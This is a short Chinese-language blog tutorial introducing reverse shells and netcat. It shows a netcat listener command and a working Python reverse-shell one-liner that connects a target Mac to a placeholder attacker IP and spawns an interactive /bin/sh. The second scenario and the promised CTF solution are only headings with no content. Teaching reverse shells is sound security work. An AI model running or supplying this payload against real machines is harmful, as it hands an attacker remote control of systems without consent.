---
title: 反弹shell入门
layout: post
categories: Web安全
tags: shell
---

主要就是通过几个实例来简单介绍和演示一下反弹 shell，以及 nc(Netcat)的使用。后面顺便有一个 bugku 上的题目这里直接给出解答。

<!--more-->

## 0x01 实验环境

1.第一种情况

靶机: Mac

攻击机: 阿里云上的一台机器(Ubuntu)

首先在阿里云上监听端口:

```
nc -lvv 8888
```

然后在目标机器 Mac 上反弹 shell：

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("攻击机的 IP",被监听的端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

然后你在攻击机上就接手了目标机器



2.第二种情况

靶机: 阿里云上的一台机器(Ubuntu)

攻击机：Mac



参考：https://www.bodkin.ren/index.php/archives/298/











